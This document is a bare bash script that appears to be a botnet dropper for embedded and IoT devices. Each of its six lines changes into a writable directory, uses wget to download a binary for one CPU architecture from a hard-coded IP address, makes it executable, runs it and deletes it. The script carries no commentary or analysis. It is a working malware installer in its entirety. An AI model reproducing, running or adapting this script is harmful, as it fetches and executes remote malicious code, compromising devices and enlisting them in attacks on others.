#!/bin/bash
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://150.241.88.132/mips; chmod +x mips; ./mips; rm -rf mips
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://150.241.88.132/mipsel; chmod +x mipsel; ./mipsel; rm -rf mipsel
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://150.241.88.132/sh4; chmod +x sh4; ./sh4; rm -rf sh4
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://150.241.88.132/powerpc; chmod +x powerpc; ./powerpc; rm -rf powerpc
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://150.241.88.132/i586; chmod +x i586; ./i586; rm -rf i586
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://150.241.88.132/m68k; chmod +x m68k; ./m68k; rm -rf m68k
